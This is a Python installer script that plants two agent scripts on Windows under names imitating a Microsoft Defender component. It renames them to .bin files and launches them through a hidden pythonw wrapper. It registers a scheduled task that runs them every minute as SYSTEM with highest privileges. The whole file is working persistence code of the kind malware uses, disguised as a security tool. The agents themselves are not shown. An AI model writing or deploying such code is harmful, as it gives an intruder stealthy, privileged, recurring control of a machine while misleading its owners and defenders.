import os
import sys
import shutil
import subprocess
from pathlib import Path

INSTALL_DIR = r"C:\ProgramData\Microsoft\MpCmdRunExperimental\Setup"
SYSTEM_TASK_NAME = r"\Experimental\Windows\Security\MpCmdRunExperimental\System"

BASE_DIR = os.path.abspath(os.path.dirname(__file__))

SYSTEM_SRC = os.path.join(BASE_DIR, "system_agent.py")
USER_SRC = os.path.join(BASE_DIR, "user_agent.py")

SYSTEM_DST = os.path.join(INSTALL_DIR, "SYS.bin")
USER_DST = os.path.join(INSTALL_DIR, "USER.bin")

os.makedirs(INSTALL_DIR, exist_ok=True)

shutil.copy2(SYSTEM_SRC, SYSTEM_DST)
shutil.copy2(USER_SRC, USER_DST)

PYTHON_EXE = Path(sys.executable).with_name("pythonw.exe")

wrapper = f'''@echo off
"{PYTHON_EXE}" %*
'''

WRAPPER_PATH = (Path(INSTALL_DIR) / "MpCmdRunEx.cmd")
WRAPPER_PATH.write_text(wrapper, encoding="utf-8")


subprocess.run(
    [
        "schtasks",
        "/create",
        "/f",
        "/sc", "minute",
        "/mo", "1",
        "/ru", "SYSTEM",
        "/rl", "highest",
        "/tn", SYSTEM_TASK_NAME,
        "/tr", f'"{WRAPPER_PATH}" "{SYSTEM_DST}"'
    ],
    check=True
)

print(f"Installed to: {INSTALL_DIR}")
print("Tasks created")
print(f'"{PYTHON_EXE}" "{SYSTEM_DST}"')
print("Installation completed successfully.")